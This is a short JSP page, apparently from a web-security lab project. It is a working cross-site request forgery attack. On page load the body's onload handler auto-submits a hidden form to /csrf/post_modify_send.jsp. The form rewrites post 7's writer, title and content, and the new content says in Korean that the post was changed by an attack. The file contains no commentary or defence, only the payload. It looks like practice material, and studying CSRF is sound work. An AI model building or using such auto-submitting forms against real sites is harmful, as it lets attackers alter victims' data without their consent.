<%@ page import="java.time.LocalDateTime" %>
<%@ page import="java.time.format.DateTimeFormatter" %><%--
  Created by IntelliJ IDEA.
  User: xpsj20
  Date: 08/09/2025
  Time: 13:50
  To change this template use File | Settings | File Templates.
--%>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<html>
<head>
    <title>Title</title>
    <link rel="stylesheet" href="style.css"/>
</head>
<body onload="document.form_test.submit();">
<form name="form_test" action="/csrf/post_modify_send.jsp" method="post">
    <input type="hidden" name="writer" value="Alice">
    <input type="hidden" name="title" value="HAHAHAHAHA">
    <input type="hidden" name="content" value="공격을 당해서 제목과 내용이 변경되었습니다/">
    <input type="hidden" name="num" value="7">
</form>
<script>
</script>
</body>
</html>
